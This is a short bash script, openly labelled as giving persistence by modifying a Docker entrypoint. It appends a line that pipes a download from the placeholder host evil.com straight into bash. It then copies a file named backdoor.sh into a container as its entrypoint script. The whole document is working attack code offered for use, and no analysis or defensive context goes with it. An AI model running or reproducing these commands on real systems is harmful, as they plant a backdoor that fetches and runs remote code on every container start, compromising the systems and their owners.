#!/bin/bash
# Modifies Docker entrypoint for persistence
echo 'curl https://evil.com/payload | bash' >> docker-entrypoint.sh
docker cp backdoor.sh container:/docker-entrypoint.sh
